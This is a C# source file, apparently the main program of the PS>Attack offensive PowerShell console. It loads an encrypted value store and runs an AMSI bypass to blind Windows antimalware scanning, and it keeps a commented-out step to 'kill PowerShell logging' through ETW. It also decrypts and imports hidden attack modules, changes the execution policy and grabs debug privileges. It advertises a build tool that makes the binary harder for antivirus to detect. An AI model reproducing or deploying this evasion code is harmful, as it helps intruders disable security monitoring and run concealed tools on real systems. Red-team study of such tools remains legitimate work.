﻿using System;
using System.IO;
using System.Text;
using System.Security.Principal;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using PSAttack.PSAttackProcessing;
using PSAttack.Utils;
using PSAttack.PSAttackShell;

namespace PSAttack
{
    class Program
    {
        static AttackState PSInit()
        {
            // Display Loading Message
            Console.ForegroundColor = PSColors.logoText;
            Random random = new Random();
            int pspLogoInt = random.Next(Strings.psaLogos.Count);
            Console.WriteLine(Strings.psaLogos[pspLogoInt]);
            Console.WriteLine("Loading...");

            // create attackState
            AttackState attackState = new AttackState();

            // Check if we're in a console
            attackState.cursorPos = attackState.promptLength;


            // Get Encrypted Values
            Assembly assembly = Assembly.GetExecutingAssembly();
            String valueStoreString = Properties.Settings.Default.valueStore;
            Stream valueStream = assembly.GetManifestResourceStream("PSAttack.Resources." + valueStoreString);
            MemoryStream valueStore = CryptoUtils.DecryptFile(valueStream);
            string valueStoreStr = Encoding.Unicode.GetString(valueStore.ToArray());

            string[] valuePairs = valueStoreStr.Replace("\r","").Split('\n');

            foreach (string value in valuePairs)
            {
                if (value != "")
                {
                    string[] entry = value.Split('|');
                    attackState.decryptedStore.Add(entry[0], entry[1]);
                }
            }

            // Kill PowerShell Logging :)
            //try
            //{
            //    attackState.cmd = attackState.decryptedStore["etwBypass"];
            //    Processing.PSExec(attackState);
            //}
            //catch
            //{
            //    Console.WriteLine("Disabling ETW failed.");
            //}

            // amsi bypass (thanks matt!!)
            if (Environment.OSVersion.Version.Major > 9)
            {
                try
                {
                    attackState.cmd = attackState.decryptedStore["amsiBypass"];
                    Processing.PSExec(attackState);
                }
                catch
                {
                    Console.WriteLine("Could not run AMSI bypass.");
                }
            }

            // Decrypt modules
            string[] resources = assembly.GetManifestResourceNames();
            foreach (string resource in resources)
            {
                if (resource.Contains("PSAttack.Modules."))
                {
                    string fileName = resource.Replace("PSAttack.Modules.", "");
                    string decFilename = CryptoUtils.DecryptString(fileName);
                    Console.ForegroundColor = PSColors.loadingText;
                    Console.WriteLine("Decrypting: {0}", decFilename);
                    Stream moduleStream = assembly.GetManifestResourceStream(resource);
                    PSAUtils.ImportModules(attackState, moduleStream);
                }
            }
            // Setup PS env
            attackState.cmd = attackState.decryptedStore["setExecutionPolicy"];
            Processing.PSExec(attackState);

            // check for admin 
            Boolean isAdmin = false;
            Boolean debugProc = false;
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                isAdmin = true;
                try
                {
                    System.Diagnostics.Process.EnterDebugMode();
                    debugProc = true;
                }
                catch
                {
                    Console.Write("Could not grab debug rights for process.");
                }
            }
            
            
            //Console.BufferHeight = Int16.MaxValue - 10;
            
            if (attackState.console == true)
            {
                // Setup Console
                Console.Title = Strings.windowTitle;
                Console.BackgroundColor = PSColors.background;
                //Console.TreatControlCAsInput = true;
                Console.Clear();
            }   

            // get build info
            string buildString;
            Boolean builtWithBuildTool = true;

            DateTime storedBuildDate = new DateTime();
            try
            {
                storedBuildDate = Convert.ToDateTime(attackState.decryptedStore["buildDate"]);
            }
            catch
            {
                
            }

            DateTime textBuildDate = new DateTime();
            try
            {
                string buildDate = new StreamReader(assembly.GetManifestResourceStream("PSAttack.Resources.BuildDate.txt")).ReadToEnd();
                textBuildDate = Convert.ToDateTime(buildDate);
            }
            catch
            {

            }
            if (storedBuildDate > textBuildDate)
            {                
                buildString = "Build Date " + storedBuildDate + "\n\nThis is a custom baked build.\n"; 
            }
            else
            {
                buildString = "Build Date " + textBuildDate + "\n\nIf you'd like a version of PS>Attack thats even harder for AV \nto detect checkout http://github.com/jaredhaight/PSAttackBuildTool \n";
                builtWithBuildTool = false;
            }

            // Figure out if we're 32 or 64bit
            string arch = "64bit";
            if (IntPtr.Size == 4)
            {
                arch = "32bit";
            }

            // setup debug variable
            String debugCmd = "$debug = @{'psaVersion'='" + Strings.version + "';'osVersion'='" + Environment.OSVersion.ToString() + "';'.NET'='"
                + System.Environment.Version + "';'isAdmin'='"+ isAdmin + "';'builtWithBuildTool'='" + builtWithBuildTool.ToString() +"';'debugRights'='"
                + debugProc + "';'arch'='" + arch + "'}";
            attackState.cmd = debugCmd;
            Processing.PSExec(attackState);

            // print intro
            Console.ForegroundColor = PSColors.introText;
            Console.WriteLine(Strings.welcomeMessage, Strings.version, buildString);

            // Display Prompt
            attackState.ClearLoop();
            attackState.ClearIO();
            Display.printPrompt(attackState);

            return attackState;
        }

        public class Start
        {
            public static void launchPSAttack()
            {
                AttackState attackState = PSInit();
                while (true)
                {
                    if (attackState.console)
                    {
                        attackState.keyInfo = Console.ReadKey();
                    }
                    else
                    {
                        attackState.cmd = Console.ReadLine();
                    }
                    attackState = Processing.CommandProcessor(attackState);
                    if (attackState.console)
                    {
                        Display.Output(attackState);
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            Start.launchPSAttack();
        }
    }
}